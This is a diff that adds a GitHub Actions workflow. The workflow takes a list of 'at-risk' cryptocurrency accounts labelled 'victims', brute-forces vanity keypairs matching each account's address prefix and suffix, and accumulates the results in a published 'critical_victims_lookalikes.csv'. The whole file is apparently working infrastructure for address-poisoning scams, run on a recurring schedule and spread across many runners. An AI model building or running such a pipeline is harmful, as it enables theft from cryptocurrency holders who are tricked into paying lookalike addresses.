@@ -1,0 +1,158 @@
+name: Vanity lookalikes for critical victims
+
+on:
+  schedule:
+    - cron: "0 */3 * * *"   # continues basic coverage windows automatically
+  workflow_dispatch:
+    inputs:
+      strong_count:
+        description: "victims receiving strong lookalikes (prefix4+suffix3 attempts)"
+        default: "50"
+      medium_count:
+        description: "victims receiving medium lookalikes (prefix3+suffix3 attempts)"
+        default: "2000"
+      basic_count:
+        description: "victims per pass receiving basic lookalikes (prefix3+suffix2)"
+        default: "10000"
+      offset:
+        description: "override basic window start rank (blank = use saved state)"
+        default: ""
+
+permissions:
+  contents: write
+
+concurrency:
+  group: vanity
+  cancel-in-progress: false
+
+jobs:
+  prepare:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    outputs:
+      offset: ${{ steps.calc.outputs.offset }}
+    env:
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - name: Download at-risk CSV
+        run: gh release download scan-data -p "eoas_at_risk.csv" -D . --clobber
+      - name: Build critical targets
+        run: python -m src.vanity_targets --in eoas_at_risk.csv --out critical_targets.csv
+      - name: Determine basic window offset
+        id: calc
+        env:
+          INPUT_OFFSET: ${{ inputs.offset }}
+        run: |
+          OFFSET="$INPUT_OFFSET"
+          if [ -z "$OFFSET" ]; then
+            gh release download scan-data -p "vanity_state.json" -D . --clobber 2>/dev/null || true
+            if [ -f vanity_state.json ]; then
+              OFFSET=$(python -c "import json;print(json.load(open('vanity_state.json')).get('offset',0))")
+            else
+              OFFSET=0
+            fi
+          fi
+          echo "offset=$OFFSET" >> "$GITHUB_OUTPUT"
+          echo "basic window starts at rank $OFFSET"
+      - name: Publish targets
+        run: gh release upload scan-data critical_targets.csv --clobber
+      - uses: actions/upload-artifact@v4
+        with:
+          name: critical-targets
+          path: critical_targets.csv
+          retention-days: 7
+
+  generate:
+    needs: prepare
+    runs-on: ubuntu-latest
+    timeout-minutes: 330
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19]
+    env:
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - name: Install libsecp256k1 and build vanity
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq libsecp256k1-dev
+          cc -O2 -o vanity vanity/vanity.c -lsecp256k1
+          ./vanity --selftest
+      - name: Download targets
+        run: gh release download scan-data -p "critical_targets.csv" -D . --clobber
+      - name: Generate lookalikes (shard ${{ matrix.shard }})
+        run: |
+          python -m src.vanity_driver \
+            --targets critical_targets.csv \
+            --out lookalikes_${{ matrix.shard }}.csv \
+            --binary ./vanity \
+            --shard ${{ matrix.shard }} \
+            --num-shards 20 \
+            --cores 4 \
+            --strong-count ${{ inputs.strong_count || 50 }} \
+            --medium-count ${{ inputs.medium_count || 2000 }} \
+            --offset ${{ needs.prepare.outputs.offset }} \
+            --basic-count ${{ inputs.basic_count || 10000 }}
+      - name: Publish shard results
+        if: always()
+        run: |
+          if [ -f lookalikes_${{ matrix.shard }}.csv ]; then
+            gh release upload scan-data lookalikes_${{ matrix.shard }}.csv --clobber || true
+          fi
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: lookalikes-${{ matrix.shard }}
+          path: lookalikes_*.csv
+          if-no-files-found: warn
+          retention-days: 7
+
+  merge:
+    needs: [prepare, generate]
+    if: always()
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - uses: actions/download-artifact@v4
+        with:
+          pattern: lookalikes-*
+          path: shards
+      - name: Merge cumulative CSV
+        run: |
+          gh release download scan-data -p "critical_victims_lookalikes.csv" -D . --clobber 2>/dev/null || true
+          python -m src.vanity_merge --new shards --existing critical_victims_lookalikes.csv --out critical_victims_lookalikes.csv
+          gh release upload scan-data critical_victims_lookalikes.csv --clobber
+      - name: Advance state window
+        env:
+          OFFSET: ${{ needs.prepare.outputs.offset }}
+          BASIC: ${{ inputs.basic_count || 10000 }}
+        run: |
+          python - <<'EOF'
+          import json, os
+          offset = int(os.environ.get("OFFSET") or 0)
+          basic = int(os.environ.get("BASIC") or 10000)
+          json.dump({"offset": offset + basic}, open("vanity_state.json", "w"))
+          print("new offset:", offset + basic)
+          EOF
+          gh release upload scan-data vanity_state.json --clobber
+      - uses: actions/upload-artifact@v4
+        with:
+          name: critical_victims_lookalikes
+          path: critical_victims_lookalikes.csv
+          if-no-files-found: warn
+          retention-days: 14
